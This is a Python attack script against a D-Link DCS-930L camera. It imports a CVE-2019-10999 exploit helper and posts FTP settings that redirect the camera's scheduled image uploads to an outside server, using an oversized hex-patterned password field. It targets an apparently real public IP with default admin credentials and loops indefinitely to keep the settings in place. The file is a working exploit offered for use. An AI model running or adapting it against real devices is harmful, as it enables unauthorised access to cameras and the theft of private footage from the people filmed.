import requests
from CVE_2019_10999.DlinkExploit import util
import time

form_data = {
    "ReplySuccessPage": "upload.htm",
    "ReplyErrorPage": "errrftp.htm",
    "FTPScheduleEnable": "1",
    "FTPScheduleDay": "127",
    "FTPCreateFolderInterval": "0",
    "SessionKey": "1452017370",
    "FTPHostAddress": "139.180.220.58",
    "FTPPortNumber": "21",
    "FTPUserName": "user",
    "FTPPassword": "63c76363040463239a636fc3636f9a63c7c76363040463239a6396c363189a63c7c76363040463239a6396c363189a63c7c76363040463239a6396c363189a63",
    "FTPDirectoryPath": "/upload",
    "FTPPassiveMode": "1",
    "FTPScheduleMode": "0",
    "FTPScheduleFramePerSecond": "1",
    "FTPScheduleFramePerSecondSel": "1",
    "FTPScheduleVideoFrequencyMode": "1",
    "FTPScheduleSecondPerFrame": "60",
    "FTPScheduleBaseFileName": "DCS-930L",
    "FTPScheduleFileMode": "1",
    "ConfigSystemFTP": " Save "
}

headers = {
    "Referer": "/upload.htm",
}

def set_camera_ftp_settings(host,port,username,password):
    auth = util.create_http_auth(host,port,username,password)
    url = f"http://{host}:{port}/setSystemFTP"
    
    succeed = False
    while True:
        response = requests.post(url, data=form_data,auth=auth,headers=headers)
        
        print(response)
        r = requests.get(f"http://{host}:{port}/upload.htm",auth=auth,headers=headers)
        if form_data["FTPHostAddress"] in r.text:
            time.sleep(300)
        else:
            time.sleep(60)
            
    pass

if __name__ == "__main__":
    set_camera_ftp_settings("73.238.133.237",37591,"admin","")